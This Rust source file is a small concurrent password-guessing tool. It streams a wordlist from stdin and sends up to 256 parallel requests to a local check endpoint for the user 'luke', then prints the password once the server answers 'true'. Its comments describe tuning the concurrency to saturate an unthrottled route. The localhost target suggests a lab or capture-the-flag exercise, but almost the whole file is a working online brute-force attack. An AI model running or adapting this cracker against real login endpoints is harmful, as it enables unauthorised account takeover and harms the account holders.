use std::{
    io::{self, BufRead},
    process,
};

use anyhow::{Result, anyhow, ensure};
use futures::{StreamExt, stream};
use indicatif::{ProgressBar, ProgressStyle};
use reqwest::ClientBuilder;
use tracing::debug;

// Password checking is network-bound: the client spends its time waiting on
// round-trips, not the CPU, so concurrency should track how many requests the
// server will service at once rather than the core count. The check route is
// unthrottled and Caddy multiplexes these tiny requests over a single HTTP/2
// connection, whose stream limit is Go's default of 250. 256 saturates that
// ceiling while staying well under the open-file limit if the connection ever
// falls back to HTTP/1.1, where each request needs its own socket.
const CONCURRENCY: usize = 256;

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt::init();

    let client = ClientBuilder::new().build()?;

    // The input is streamed, so the total is unknown until we reach the end. A
    // spinner reports rate and count without a percentage or ETA.
    let pb = ProgressBar::new_spinner();
    pb.set_style(ProgressStyle::with_template(
        "{spinner:.green} [{elapsed_precise}] {human_pos} checked ({per_sec})",
    )?);

    // Read stdin line by line and let buffer_unordered pull lines on demand, so
    // at most CONCURRENCY passwords are resident no matter how large the file is.
    let lines = io::stdin().lock().lines();

    let bodies = stream::iter(lines)
        .map(|line| {
            let client = &client;
            async move {
                let pass = line?;
                let url = format!("http://localhost:3000/u/luke/check/{pass}");
                let resp = client.get(url).send().await?;
                ensure!(resp.status().is_success(), "Bad http request");
                let text = resp.text().await?;
                let result: Result<(String, String)> = Ok((pass, text));
                result
            }
        })
        .buffer_unordered(CONCURRENCY);

    bodies
        .for_each(|b| async {
            pb.inc(1);
            match b {
                Ok((pass, body)) if &body == "true" => {
                    pb.finish_and_clear();
                    println!("Password is: {pass}");
                    process::exit(0);
                }
                Ok((pass, body)) => {
                    debug!("{pass}: {body}");
                }
                _ => {}
            }
        })
        .await;

    pb.finish_and_clear();
    Err(anyhow!("Didn't find the password :("))
}
